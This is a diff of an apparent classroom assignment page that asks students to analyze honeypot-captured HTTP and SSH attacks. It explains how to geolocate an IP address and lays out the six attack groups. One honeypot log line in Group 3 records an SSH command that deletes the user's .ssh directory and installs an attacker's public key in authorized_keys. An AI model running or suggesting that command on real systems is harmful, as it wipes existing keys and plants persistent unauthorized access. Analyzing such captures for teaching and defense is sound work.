@@ -1,4 +1,7 @@
 
+# Attacks for analysis
+
+
 Below you'll find 6 groups of attacks, 2 attacks per group (HTTP, SSH). Choose the group of attacks that you would like to analyze.
 
 Feel free to analyze the attacks however you want, just make sure that your analysis has the following
@@ -10,7 +13,6 @@ Feel free to analyze the attacks however you want, just make sure that your anal
 - Recommended fix and or prevention measures to mitigate similar attacks
 
 You can even paste in your attacks into chatgpt along with the requirements(IP Address, Service targeted, Description, etc) and use that as a guide to help you. 
-
 
 ## How to Geolocate an IP Address
 
@@ -24,7 +26,7 @@ https://whatismyipaddress.com/ip/142.250.189.228
 ```
 
 
-
+***
 ### Analysis Group 1: Daniel 
 
 HTTP Attack
@@ -38,6 +40,7 @@ SSH Attack
 ```
 
 
+***
 ### Analysis Group 2: 
 
 HTTP Attack
@@ -51,6 +54,7 @@ SSH Attack
 ```
 
 
+***
 ### Analysis Group 3: 
 
 HTTP Attack
@@ -63,6 +67,8 @@ SSH Attack
 2024-11-01T09:38:16+0000 [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,761,193.70.0.177] CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
 ```
 
+
+***
 ### Analysis Group 4:
 
 HTTP Attack
@@ -92,6 +98,7 @@ SSH Attack
 ```
 
 
+***
 ### Analysis Group 5:
 
 HTTP attack
@@ -120,6 +127,7 @@ SSH Attack
 ```
 
 
+***
 ### Analysis Group 6:
 
 HTTP attack
